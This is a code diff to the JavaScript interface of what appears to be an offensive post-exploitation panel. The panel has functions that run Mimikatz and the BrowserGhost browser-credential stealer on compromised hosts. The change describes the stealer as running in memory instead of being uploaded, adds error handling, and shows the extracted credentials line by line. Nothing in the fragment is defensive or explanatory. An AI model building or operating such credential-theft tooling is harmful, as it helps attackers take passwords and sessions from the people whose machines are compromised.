@@ -1111,7 +1111,7 @@ function executeMimikatz(command) {
 function executeBrowserSteal() {
     addLog('正在提取浏览器凭证...', 'warn');
     const panel = document.getElementById('browserResult');
-    panel.textContent = '[*] 正在上传并执行 BrowserGhost，请等待...\n';
+    panel.textContent = '[*] 正在内存中执行 BrowserGhost，请等待...\n';
     panel.classList.add('show');
 
     getFirstSessionId()
@@ -1124,7 +1124,13 @@ function executeBrowserSteal() {
         })
         .then(r => r.json())
         .then(result => {
-            panel.textContent = JSON.stringify(result, null, 2);
+            if (!result.success) {
+                panel.textContent = '[!] 执行失败: ' + (result.error || '未知错误');
+                addLog('浏览器凭证提取失败', 'error');
+                return;
+            }
+            // 逐行显示，干净可读
+            panel.textContent = result.output;
             addLog('浏览器凭证提取完成', 'success');
         })
         .catch(err => {
